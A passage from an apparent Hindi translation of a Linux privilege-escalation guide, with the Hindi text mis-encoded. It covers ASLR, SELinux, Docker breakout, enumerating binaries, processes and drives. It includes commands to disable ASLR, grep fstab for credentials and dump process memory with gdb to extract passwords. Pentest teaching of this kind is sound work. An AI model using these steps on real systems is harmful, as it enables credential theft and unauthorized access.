Execshield рдПрдХ рд▓рд┐рдирдХреНрд╕ рдХрд░реНрдирд▓ рд╕реБрд░рдХреНрд╖рд╛ рдлрд╝реАрдЪрд░ рд╣реИ рдЬреЛ рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдмрдлрд╝рд░ рдУрд╡рд░рдлрд╝реНрд▓реЛ рдХреЛ рд░реЛрдХрдиреЗ рдФрд░ рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЕрдирдзрд┐рдХреГрдд рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди рд╕реЗ рдмрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдПрдХреНрдЬреАрдХреНрдпреВрд╢реАрд▓реНрдб рдмрдлрд╝рд░ рдУрд╡рд░рдлрд╝реНрд▓реЛ рдФрд░ рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди рд╡рд┐рдлрд▓рддрд╛ рдХреЗ рдХрдИ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдмрдлрд╝рд░ рдУрд╡рд░рдлрд╝реНрд▓реЛ, рд░рд┐рдЯрд░реНрди-рдУрд╡рд░рдлрд╝реНрд▓реЛ, рдФрд░ рд╢реИрд▓ рдУрд╡рд░рдлрд╝реНрд▓реЛред

Execshield рдХреЛ рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред Execshield рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЕрдзрд┐рдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди рдХреЗ рджреМрд░рд╛рди рдмрдлрд╝рд░ рдУрд╡рд░рдлрд╝реНрд▓реЛ рдФрд░ рдЕрдирдзрд┐рдХреГрдд рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди рд╕реЗ рдмрдЪрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

SElinux (Security-Enhanced Linux) рдПрдХ Linux kernel security module рд╣реИ рдЬреЛ рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐рдпреЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдирд┐рдпрдВрддреНрд░рдг рдХрд░рдиреЗ рдФрд░ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐рдпреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред SElinux рдХреЗ рджреНрд╡рд╛рд░рд╛, рдЖрдк рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╡реНрдпрдХреНрддрд┐рдЧрдд рдпрд╛ рд╕рд╛рдЭрд╛ рд╕реНрддрд░ рдкрд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдЖрдкрдХреЛ рдЕрдзрд┐рдХ рд╕реБрд░рдХреНрд╖рд╛ рдФрд░ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред

рдпрд╣ рдПрдХ рдмрд╣реБрдд рд╣реА рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рдФрд░ рд╡реНрдпрд╛рдкрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ рд▓рд┐рдирдХреНрд╕ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рд╡рд┐рдХрд▓реНрдк рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЖрдк рдЕрдкрдиреЗ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдФрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдирдзрд┐рдХреГрдд рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ (privilege escalation) рдХреЗ рдЦрддрд░реЛрдВ рд╕реЗ рдмрдЪ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ, рд╣рдо SElinux рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд┐рд╕реНрддреГрдд рдЬрд╛рдирдХрд╛рд░реА, рдЗрд╕рдХреЗ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреЗ рддрд░реАрдХреЗ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рдирд┐рд░реНрджреЗрд╢ рдкреНрд░рджрд╛рди рдХрд░реЗрдВрдЧреЗред
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
ASLR (Address Space Layout Randomization) рдПрдХ рднреВрдорд┐рдХрд╛ рд╣реИ рдЬреЛ рд▓рд┐рдирдХреНрд╕ рдкреНрд░рдгрд╛рд▓реА рдореЗрдВ рдЙрдкрдпреЛрдЧ рд╣реЛрддреА рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╣реИ рдЕрджреНрдпрддрд┐рдд рд░рдЦрдирд╛ рдХрд┐ рдХрд┐рд╕реА рднреА рдЦрддрд░рдирд╛рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдореЗрдореЛрд░реА рдкрддреЗ рдкрд░ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХреЗред ASLR рджреНрд╡рд╛рд░рд╛, рд▓рд┐рдирдХреНрд╕ рдХреЗ рдХрд░реНрдордЪрд╛рд░реА рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдореЗрдореЛрд░реА рдкрддреЛрдВ рдХреЛ рдпрд╛рдж рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдпрд╛рджрджрд╛рд╢реНрдд рддрд╛рд▓рд┐рдХрд╛ рдмрдирд╛рддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдкреНрд░рддреНрдпреЗрдХ рдмрд╛рд░ рдЙрджреНрджреАрдкрдХ рд▓реЛрдб рд╣реЛрдиреЗ рдкрд░ рдмрджрд▓рддреЗ рд╣реИрдВред рдЗрд╕рдХрд╛ рдкрд░рд┐рдгрд╛рдо рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдореЗрдореЛрд░реА рдкрддреЗ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг рдХрд░рдирд╛ рдореБрд╢реНрдХрд┐рд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЙрдЪреНрдЪрддрдо рдЕрд╡рдзрд┐ рддрдХ рдЕрджреНрдпрддрд┐рдд рд░рдЦрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

ASLR рдХреЛ рд▓рд┐рдирдХреНрд╕ рдкреНрд░рдгрд╛рд▓реА рдореЗрдВ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:

```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

рдЗрд╕ рдХрдорд╛рдВрдб рдХреЗ рджреНрд╡рд╛рд░рд╛, ASLR рдХреЛ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдЖрдк ASLR рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдЗрд╕реЗ 0 рдкрд░ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

ASLR рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдФрд░ рдмрд╛рдж рдореЗрдВ, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ ASLR рд╕рдХреНрд╖рдо рд╣реИ рдпрд╛ рдирд╣реАрдВ:

```bash
cat /proc/sys/kernel/randomize_va_space
```

рдпрджрд┐ рдпрд╣ 2 рджрд┐рдЦрд╛рддрд╛ рд╣реИ, рддреЛ ASLR рд╕рдХреНрд╖рдо рд╣реИ, рдФрд░ рдпрджрд┐ рдпрд╣ 0 рджрд┐рдЦрд╛рддрд╛ рд╣реИ, рддреЛ ASLR рдЕрдХреНрд╖рдо рд╣реИред
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## рдбреЙрдХрд░ рдмреНрд░реЗрдХрдЖрдЙрдЯ

рдпрджрд┐ рдЖрдк рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## рдбреНрд░рд╛рдЗрд╡реНрд╕

**рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдХреНрдпрд╛ рдЕрдирдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**, рдХрд╣рд╛рдВ рдФрд░ рдХреНрдпреЛрдВред рдпрджрд┐ рдХреБрдЫ рдЕрдирдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдирд┐рдЬреА рдЬрд╛рдирдХрд╛рд░реА рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## рдЙрдкрдпреЛрдЧреА рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░

рдЙрдкрдпреЛрдЧреА рдмрд╛рдЗрдирд░реАрдЬрд╝ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ **рдХреЛрдИ рдХрдВрдкрд╛рдЗрд▓рд░ рд╕реНрдерд╛рдкрд┐рдд** рд╣реИ рдпрд╛ рдирд╣реАрдВред рдпрд╣ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдпрджрд┐ рдЖрдкрдХреЛ рдХрд░реНрдирд▓ рдЙрддреНрдкреАрдбрд╝рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛ, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ рдЖрдкрдХреЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдорд╢реАрди рдореЗрдВ (рдпрд╛ рдПрдХ рд╕рдорд╛рди) рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### рд╕рдВрдЧреНрд░рд╣реАрдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреА рд╕реНрдерд╛рдкрд┐рдд рд╕рдВрд╕реНрдХрд░рдг

**рд╕рдВрд╕реНрдХрд░рдг рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ** рд╕реНрдерд╛рдкрд┐рдд рдкреИрдХреЗрдЬ рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдХреАред рд╢рд╛рдпрдж рдХреБрдЫ рдкреБрд░рд╛рдиреЗ Nagios рд╕рдВрд╕реНрдХрд░рдг (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП) рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ...\
рд╕реБрд╕рдВрдЧрддрддрд╛ рдХреЗ рд▓рд┐рдП, рд╕рдВрджрд┐рдЧреНрдз рд╕реНрдерд╛рдкрд┐рдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреЗ рд╕рдВрд╕реНрдХрд░рдг рдХреА рдореИрдиреНрдпреБрдЕрд▓ рдЬрд╛рдВрдЪ рдХрд░рдирд╛ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред
```bash
dpkg -l #Debian
rpm -qa #Centos
```
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдорд╢реАрди рдореЗрдВ SSH рдкрд╣реБрдВрдЪ рд╣реИ, рддреЛ рдЖрдк **openVAS** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдорд╢реАрди рдХреЗ рдЕрдВрджрд░ рд╕реНрдерд╛рдкрд┐рдд рдЕрдкрдбреЗрдЯ рдФрд░ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="info" %}
_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпреЗ рдХрдорд╛рдВрдб рдмрд╣реБрдд рд╕рд╛рд░реА рдЬрд╛рдирдХрд╛рд░реА рджрд┐рдЦрд╛рдПрдВрдЧреЗ рдЬреЛ рдЕрдзрд┐рдХрд╛рдВрд╢рддрдГ рдЕрдирд░реНрдердХ рд╣реЛрдЧреА, рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИ рдХрд┐ рдРрд╕реЗ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЬреЛ рдЬрд╛рдВрдЪреЗрдВрдЧреЗ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рд╕реНрдерд╛рдкрд┐рдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕рдВрд╕реНрдХрд░рдг рдЬреНрдЮрд╛рдд рдЦрддрд░реЛрдВ рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд▓реНрдк рд╣реИ_
{% endhint %}

## рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ

**рдХреМрди рд╕реА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ** рдЪрд▓ рд░рд╣реА рд╣реИрдВ рдЙрдиреНрд╣реЗрдВ рджреЗрдЦреЗрдВ рдФрд░ рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ **рдЗрд╕рд╕реЗ рдЕрдзрд┐рдХ рдЕрдзрд┐рдХрд╛рд░** рд░рдЦрддреА рд╣реИ (рд╢рд╛рдпрдж рдПрдХ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдЪрд▓рд╛рдИ рдЬрд╛ рд░рд╣реА рдЯреЙрдордХреИрдЯ?)
```bash
ps aux
ps -ef
top -n 1
```
рд╣рдореЗрд╢рд╛ рд╕рдВрднрд╛рд╡рд┐рдд [**electron/cef/chromium debuggers** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ, рдЗрд╕реЗ рдЙрдЪреНрдЪрддрдо рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ](electron-cef-chromium-debugger-abuse.md). **Linpeas** рдЗрд╕реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдореЗрдВ `--inspect` рдкреИрд░рд╛рдореАрдЯрд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдЦреЛрдЬрддрд╛ рд╣реИред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрд╛рдЗрдирд░реА рдкрд░ рдЕрдкрдиреЗ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**, рд╢рд╛рдпрдж рдЖрдк рдХрд┐рд╕реА рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ

рдЖрдк [**pspy**](https://github.com/DominicBreuker/pspy) рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рд╡рд┐рдХрд▓реНрдкрд┐рдд рд░реВрдк рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдЬреЛрдЦрд┐рдордкреВрд░реНрдг рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдпрд╛ рдЬрдм рдПрдХ рд╕реЗрдЯ рдХреЗ рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рдкреВрд░реА рд╣реЛрддреА рд╣реИрдВред

### рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдореЛрд░реА

рд╕рд░реНрд╡рд░ рдХреА рдХреБрдЫ рд╕реЗрд╡рд╛рдПрдВ **рдореЗрдореЛрд░реА рдХреЗ рдЕрдВрджрд░ рд╕рд╛рдл рдкрд╛рда рдореЗрдВ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕рд╣реЗрдЬрддреА рд╣реИрдВ**ред\
рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдЖрдкрдХреЛ **рд░реВрдЯ рдЕрдзрд┐рдХрд╛рд░** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рддрд╛рдХрд┐ рдЖрдк рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдореЗрдореЛрд░реА рдкрдврд╝ рд╕рдХреЗрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдЬрдм рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд░реВрдЯ рд╣реИрдВ рдФрд░ рдЕрдзрд┐рдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддрдм рдЕрдзрд┐рдХ рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдЖрдЬрдХрд▓ рдЕрдзрд┐рдХрд╛рдВрд╢ рдорд╢реАрдиреЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ ptrace рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддреА рд╣реИрдВ** рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рдЕрдкрдиреЗ рдЕрдирд╛рдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рджреВрд╕рд░реА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдбрдВрдк рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдлрд╝рд╛рдЗрд▓ _**/proc/sys/kernel/yama/ptrace\_scope**_ ptrace рдХреА рдкрд╣реБрдВрдЪ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреА рд╣реИ:

* **kernel.yama.ptrace\_scope = 0**: рд╕рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рдбреАрдмрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ, рдЬрдм рддрдХ рдЙрдирдХрд╛ рдПрдХ рд╣реА uid рд╣реЛред рдпрд╣ ptracing рдХрд╛ рдХреНрд▓рд╛рд╕рд┐рдХрд▓ рддрд░реАрдХрд╛ рд╣реИред
* **kernel.yama.ptrace\_scope = 1**: рдХреЗрд╡рд▓ рдПрдХ рдорд╛рддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбреАрдмрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **kernel.yama.ptrace\_scope = 2**: рдХреЗрд╡рд▓ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ ptrace рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХреЗ рд▓рд┐рдП CAP\_SYS\_PTRACE рдХреНрд╖рдорддрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
* **kernel.yama.ptrace\_scope = 3**: рдХреЛрдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ ptrace рдХреЗ рд╕рд╛рде рдЯреНрд░реЗрд╕ рдирд╣реАрдВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред рдПрдХ рдмрд╛рд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, ptracing рдХреЛ рдлрд┐рд░ рд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреБрдирд░рд╛рд░рдВрдн рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

#### GDB

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ FTP рд╕реЗрд╡рд╛ рдХреА рдореЗрдореЛрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП) рддреЛ рдЖрдк рд╣реАрдк рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕рдХреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЗ рднреАрддрд░ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВред
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB рд╕реНрдХреНрд░рд┐рдкреНрдЯ

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps рдФрд░ /proc/$pid/mem

